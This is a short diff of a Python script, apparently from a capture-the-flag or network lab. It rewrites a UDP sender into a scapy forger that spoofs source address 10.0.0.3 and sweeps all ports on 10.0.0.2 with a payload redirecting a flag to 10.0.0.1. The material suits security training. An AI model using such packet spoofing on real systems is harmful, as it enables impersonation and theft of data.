@@ -1,6 +1,6 @@
-import socket, time
+from scapy.all import UDP, Raw, IP, send
 from multiprocessing import Process
-
+import socket, time
 
 def listener():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -11,15 +11,22 @@ def listener():
     print("Done!")
 
 def forger():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-    add = ("10.0.0.2", 31338)
-    msg = b"FLAG:10.0.0.1:3000"
-    sock.bind(("10.0.0.1", 31337))
-    i = 10
+    # time.sleep(5)
+    port = 1
     while True:
-        sock.sendto(msg, add)
-        time.sleep(0.41)
+        ip = IP(src="10.0.0.3", dst="10.0.0.2")
+        udp = UDP(sport=31337, dport=port)
+        data = Raw(load=b"FLAG:10.0.0.1:3000")
+        msg = ip / udp / data
+        i = 1
+        while i < 10:
+            send(msg, verbose=False)
+            time.sleep(0.1)
+            i += 1
+        # time.sleep(0.1)
+        port += 1
+        if port == 65535:
+            port = 0
     
 
 p1 = Process(target=listener)
